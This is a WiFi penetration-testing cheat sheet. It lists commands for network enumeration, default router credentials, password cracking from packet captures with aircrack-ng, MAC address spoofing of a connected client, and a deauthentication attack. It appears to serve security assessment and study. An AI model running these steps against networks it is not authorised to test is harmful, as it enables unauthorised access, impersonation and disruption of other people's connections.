## Enumeration

```sh
# IP addresses
ip addr
# specific interface
ip addr show eth0
ip addr show eth1
ip addr show tun0
# IPv4/6 only
ip -4 addr
ip -6 addr
# Static route
ip route

# Get the currently connected WiFi router's IP address (see the 'Default gateway' line in the output)
ipconfig

# Find any wireless devices
iw dev
# Display information of the specified device
iw dev <interface> info
# Scan wifi networks nearby the specified device
iw dev <interface> scan

# Find another computer's IP address/MAC address on the network
arp -av

# Get public IP address
curl https://api.ipify.org
```

### Using WiGLE

If BSSIDs found, we can find the location for devices using [WiGLE](https://wigle.net/).  

To find BSSID From SSID using WiGLE:

1. Access to WiGLE and login.
2. Go to View â†’ Advanced Search.
3. Open the General Search tab.
4. Input the SSID in the SSID/Network Name.
5. Check the result.

<br />

## Delete Network Interfaces From Your Devices

```sh  
ip link delete <iterface>
```

<br />

## Crack WiFi Passwords

### Default Router Credentials

```txt
admin:Admin
admin:admin
admin:password
admin:Michelangelo
root:admin
root:alpine
sitecom:Admin
telco:telco
```

### Crack from A Packet Capture File

If we have a packet capture file (.cap or .pcap) of the WiFi network, we can crack the WiFi password using the file.

```bash
aircrack-ng example.cap -w wordlist.txt
```

<br />

## MAC Address Spoofing

First of all, you need to use network adapter which has monitor mode on your machine.  
**[Aircrack-ng](https://github.com/aircrack-ng/aircrack-ng)** is a complete suite of tools to assess WiFi network security.

1. **Preparation**

    ```sh
    # Show available interfaces
    airmon-ng

    # Put an interface into monitor mode
    airmon-ng start wlan0
    airmon-ng start eth0
    # or
    iwconfig wlan0 mode monitor
    iwconfig eth0 mode monitor

    # Choose the access point (monitor mode)
    airodump-ng wlan0mon
    ```

2. **Retrieve Client's MAC Addresses**

    ```sh
    # Retrieve client's MAC address from the chosen access point
    # -c 9: channel 9
    # --bssid: target router MAC address
    # -w psk: the dump file prefix
    # eth0: interface name
    airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -i wlan0mon
    airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk eth0
    ```

3. **Spoof MAC Address using the Retrieved Address**

    ```sh
    # Take down the network at first
    ip link set wlan0 down

    # Set MAC address which you got by airodump-ng in the previous section
    macchanger -m XX:XX:XX:XX:XX:XX wlan0

    # Bring up the network
    ip link set wlan0 up
    ```

4. **Confirmation**

    ```sh
    # Check the current MAC address
    macchanger -s wlan0
    ```

5. **Reset to the Original MAC Address**

    ```sh
    # Reset to the original (permanent) MAC address
    macchanger -p wlan0
    ```

## Deauthentication Attack

Using (Freeway)[https://github.com/FLOCK4H/Freeway], we can easily achieve this attack.

```bash
sudo Freeway -i wlan1 -a deauth
```

## Other Useful Tools

- [Bettercap](https://www.bettercap.org/)

    The Swiss Army knife for 802.11, BLE, IPv4 and IPv6 networks reconnaissance and MITM attacks.

- [OUI Standards](https://standards-oui.ieee.org/oui/oui.txt)

    List of MAC OUI (Organizationally Unique Identifier). You can get the information from the BSSID.

    - **Access to the OUI Standards**
    
        If the target BSSID is "B4:5D:50:AA:86:41", search text by inputting "B4-5D-50" on the string search.  
        Then check the information.
